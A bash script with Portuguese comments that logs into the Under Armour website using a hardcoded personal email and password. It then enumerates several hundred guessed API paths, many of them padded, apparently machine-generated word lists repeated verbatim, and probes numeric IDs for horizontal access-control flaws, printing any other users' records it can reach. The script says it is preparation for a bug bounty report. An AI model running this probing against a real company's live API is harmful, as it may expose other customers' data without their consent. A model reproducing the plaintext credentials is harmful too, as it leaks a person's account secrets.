#!/bin/bash
# Script para descobrir endpoints da Under Armour e testar BAC Horizontal

BASE_URL="https://www.underarmour.com"
EMAIL="pedroocferreira@gmail.com"
PASSWORD="@Pedro9cce22f2"

echo "🔍 Fazendo login na Under Armour..."

# Fazer login e obter token
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}")

echo "Resposta do login: $LOGIN_RESPONSE"

# Extrair token (ajustar conforme a resposta)
TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.token // .access_token // .auth_token')

if [ "$TOKEN" = "null" ] || [ -z "$TOKEN" ]; then
    echo "❌ Erro: Não foi possível obter token de autenticação"
    echo "Resposta completa: $LOGIN_RESPONSE"
    echo "🔍 Tentando outros endpoints de login..."
    
    # Tentar outros endpoints de login comuns
    LOGIN_ENDPOINTS=(
        "/api/login"
        "/api/signin"
        "/api/authenticate"
        "/auth/login"
        "/login"
        "/signin"
    )
    
    for login_endpoint in "${LOGIN_ENDPOINTS[@]}"; do
        echo "Testando endpoint de login: $BASE_URL$login_endpoint"
        response=$(curl -s -X POST "$BASE_URL$login_endpoint" \
          -H "Content-Type: application/json" \
          -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}")
        
        if [ ! -z "$response" ] && [ "$response" != "null" ]; then
            echo "✅ Resposta do $login_endpoint: $response"
            TOKEN=$(echo $response | jq -r '.token // .access_token // .auth_token // .jwt')
            if [ "$TOKEN" != "null" ] && [ ! -z "$TOKEN" ]; then
                echo "✅ Token encontrado: $TOKEN"
                break
            fi
        fi
    done
fi

if [ "$TOKEN" = "null" ] || [ -z "$TOKEN" ]; then
    echo "❌ Não foi possível obter token. Continuando sem autenticação..."
    TOKEN=""
fi

# Lista de endpoints para testar
ENDPOINTS=(
    "/api/user/profile"
    "/api/profile"
    "/api/athlete"
    "/api/workouts"
    "/api/training"
    "/api/exercise"
    "/api/orders"
    "/api/purchases"
    "/api/photos"
    "/api/media"
    "/api/gallery"
    "/api/user"
    "/api/me"
    "/api/account"
    "/api/dashboard"
    "/api/settings"
    "/api/preferences"
    "/api/notifications"
    "/api/messages"
    "/api/friends"
    "/api/followers"
    "/api/activity"
    "/api/stats"
    "/api/achievements"
    "/api/badges"
    "/api/rewards"
    "/api/points"
    "/api/level"
    "/api/rank"
    "/api/leaderboard"
    "/api/competitions"
    "/api/challenges"
    "/api/goals"
    "/api/progress"
    "/api/history"
    "/api/logs"
    "/api/sessions"
    "/api/devices"
    "/api/locations"
    "/api/events"
    "/api/calendar"
    "/api/schedule"
    "/api/reminders"
    "/api/alerts"
    "/api/reports"
    "/api/analytics"
    "/api/metrics"
    "/api/insights"
    "/api/recommendations"
    "/api/suggestions"
    "/api/tips"
    "/api/advice"
    "/api/coaching"
    "/api/guidance"
    "/api/support"
    "/api/help"
    "/api/faq"
    "/api/contact"
    "/api/feedback"
    "/api/reviews"
    "/api/ratings"
    "/api/comments"
    "/api/likes"
    "/api/shares"
    "/api/bookmarks"
    "/api/favorites"
    "/api/wishlist"
    "/api/cart"
    "/api/checkout"
    "/api/payment"
    "/api/billing"
    "/api/subscription"
    "/api/membership"
    "/api/plan"
    "/api/package"
    "/api/offer"
    "/api/promo"
    "/api/coupon"
    "/api/discount"
    "/api/deal"
    "/api/sale"
    "/api/special"
    "/api/limited"
    "/api/exclusive"
    "/api/vip"
    "/api/premium"
    "/api/pro"
    "/api/elite"
    "/api/master"
    "/api/expert"
    "/api/advanced"
    "/api/intermediate"
    "/api/beginner"
    "/api/novice"
    "/api/rookie"
    "/api/amateur"
    "/api/professional"
    "/api/athlete"
    "/api/coach"
    "/api/trainer"
    "/api/instructor"
    "/api/mentor"
    "/api/guide"
    "/api/advisor"
    "/api/consultant"
    "/api/specialist"
    "/api/expert"
    "/api/authority"
    "/api/leader"
    "/api/champion"
    "/api/winner"
    "/api/hero"
    "/api/star"
    "/api/legend"
    "/api/icon"
    "/api/idol"
    "/api/role_model"
    "/api/inspiration"
    "/api/motivation"
    "/api/encouragement"
    "/api/support"
    "/api/help"
    "/api/assistance"
    "/api/aid"
    "/api/service"
    "/api/care"
    "/api/attention"
    "/api/focus"
    "/api/concentration"
    "/api/dedication"
    "/api/commitment"
    "/api/passion"
    "/api/enthusiasm"
    "/api/energy"
    "/api/power"
    "/api/strength"
    "/api/force"
    "/api/might"
    "/api/potency"
    "/api/vigor"
    "/api/vitality"
    "/api/health"
    "/api/wellness"
    "/api/fitness"
    "/api/condition"
    "/api/state"
    "/api/status"
    "/api/position"
    "/api/rank"
    "/api/level"
    "/api/grade"
    "/api/score"
    "/api/rating"
    "/api/assessment"
    "/api/evaluation"
    "/api/measurement"
    "/api/metric"
    "/api/indicator"
    "/api/signal"
    "/api/marker"
    "/api/flag"
    "/api/tag"
    "/api/label"
    "/api/name"
    "/api/title"
    "/api/designation"
    "/api/role"
    "/api/function"
    "/api/purpose"
    "/api/objective"
    "/api/goal"
    "/api/target"
    "/api/aim"
    "/api/intention"
    "/api/plan"
    "/api/strategy"
    "/api/approach"
    "/api/method"
    "/api/technique"
    "/api/system"
    "/api/process"
    "/api/procedure"
    "/api/routine"
    "/api/habit"
    "/api/practice"
    "/api/exercise"
    "/api/workout"
    "/api/training"
    "/api/coaching"
    "/api/instruction"
    "/api/education"
    "/api/learning"
    "/api/development"
    "/api/growth"
    "/api/improvement"
    "/api/enhancement"
    "/api/optimization"
    "/api/maximization"
    "/api/amplification"
    "/api/boost"
    "/api/increase"
    "/api/rise"
    "/api/advancement"
    "/api/progress"
    "/api/evolution"
    "/api/transformation"
    "/api/change"
    "/api/modification"
    "/api/adjustment"
    "/api/adaptation"
    "/api/customization"
    "/api/personalization"
    "/api/individualization"
    "/api/specialization"
    "/api/expertise"
    "/api/mastery"
    "/api/skill"
    "/api/ability"
    "/api/capability"
    "/api/competence"
    "/api/proficiency"
    "/api/talent"
    "/api/gift"
    "/api/strength"
    "/api/advantage"
    "/api/benefit"
    "/api/value"
    "/api/worth"
    "/api/importance"
    "/api/significance"
    "/api/meaning"
    "/api/purpose"
    "/api/reason"
    "/api/cause"
    "/api/motivation"
    "/api/inspiration"
    "/api/drive"
    "/api/ambition"
    "/api/aspiration"
    "/api/dream"
    "/api/vision"
    "/api/mission"
    "/api/goal"
    "/api/objective"
    "/api/target"
    "/api/aim"
    "/api/intention"
    "/api/plan"
    "/api/strategy"
    "/api/approach"
    "/api/method"
    "/api/technique"
    "/api/system"
    "/api/process"
    "/api/procedure"
    "/api/routine"
    "/api/habit"
    "/api/practice"
    "/api/exercise"
    "/api/workout"
    "/api/training"
    "/api/coaching"
    "/api/instruction"
    "/api/education"
    "/api/learning"
    "/api/development"
    "/api/growth"
    "/api/improvement"
    "/api/enhancement"
    "/api/optimization"
    "/api/maximization"
    "/api/amplification"
    "/api/boost"
    "/api/increase"
    "/api/rise"
    "/api/advancement"
    "/api/progress"
    "/api/evolution"
    "/api/transformation"
    "/api/change"
    "/api/modification"
    "/api/adjustment"
    "/api/adaptation"
    "/api/customization"
    "/api/personalization"
    "/api/individualization"
    "/api/specialization"
    "/api/expertise"
    "/api/mastery"
    "/api/skill"
    "/api/ability"
    "/api/capability"
    "/api/competence"
    "/api/proficiency"
    "/api/talent"
    "/api/gift"
    "/api/strength"
    "/api/advantage"
    "/api/benefit"
    "/api/value"
    "/api/worth"
    "/api/importance"
    "/api/significance"
    "/api/meaning"
    "/api/purpose"
    "/api/reason"
    "/api/cause"
    "/api/motivation"
    "/api/inspiration"
    "/api/drive"
    "/api/ambition"
    "/api/aspiration"
    "/api/dream"
    "/api/vision"
    "/api/mission"
)

echo "🔍 Testando endpoints descobertos..."

# Função para testar BAC Horizontal
test_bac_horizontal() {
    local endpoint="$1"
    local token="$2"
    
    echo "Testando BAC Horizontal em: $endpoint"
    
    # Testar com diferentes IDs
    for id in 1 2 3 999 1000 9999; do
        test_url="$BASE_URL$endpoint?id=$id"
        echo "  Testando ID $id: $test_url"
        
        if [ ! -z "$token" ]; then
            bac_response=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "Authorization: Bearer $token" \
                "$test_url")
        else
            bac_response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")
        fi
        
        if [ "$bac_response" = "200" ]; then
            echo "  🚨 POSSÍVEL BAC HORIZONTAL! ID $id acessível"
            if [ ! -z "$token" ]; then
                curl -s -H "Authorization: Bearer $token" "$test_url" | jq . | head -20
            else
                curl -s "$test_url" | jq . | head -20
            fi
        elif [ "$bac_response" = "403" ]; then
            echo "  ✅ Protegido (403 Forbidden)"
        elif [ "$bac_response" = "401" ]; then
            echo "  ✅ Protegido (401 Unauthorized)"
        elif [ "$bac_response" = "404" ]; then
            echo "  ❌ Não encontrado (404)"
        else
            echo "  ⚠️  Resposta inesperada: $bac_response"
        fi
    done
}

# Testar cada endpoint
for endpoint in "${ENDPOINTS[@]}"; do
    echo "Testando: $BASE_URL$endpoint"
    
    if [ ! -z "$TOKEN" ]; then
        response=$(curl -s -o /dev/null -w "%{http_code}" \
            -H "Authorization: Bearer $TOKEN" \
            "$BASE_URL$endpoint")
    else
        response=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL$endpoint")
    fi
    
    if [ "$response" = "200" ]; then
        echo "✅ Endpoint ativo: $endpoint"
        test_bac_horizontal "$endpoint" "$TOKEN"
    elif [ "$response" = "401" ]; then
        echo "🔒 Endpoint requer autenticação: $endpoint"
        if [ ! -z "$TOKEN" ]; then
            test_bac_horizontal "$endpoint" "$TOKEN"
        fi
    elif [ "$response" = "403" ]; then
        echo "🚫 Endpoint proibido: $endpoint"
    elif [ "$response" = "404" ]; then
        echo "❌ Endpoint não encontrado: $endpoint"
    else
        echo "⚠️  Resposta inesperada ($response): $endpoint"
    fi
    
    echo "---"
done

echo "🎯 Teste de BAC Horizontal concluído!"
echo "📋 Resumo:"
echo "  - Endpoints testados: ${#ENDPOINTS[@]}"
echo "  - IDs testados por endpoint: 6"
echo "  - Total de testes: $((${#ENDPOINTS[@]} * 6))"
echo ""
echo "🔍 Próximos passos:"
echo "  1. Analisar respostas 200 para identificar BAC Horizontal"
echo "  2. Documentar vulnerabilidades encontradas"
echo "  3. Capturar evidências (screenshots, responses)"
echo "  4. Preparar relatório de bug bounty"
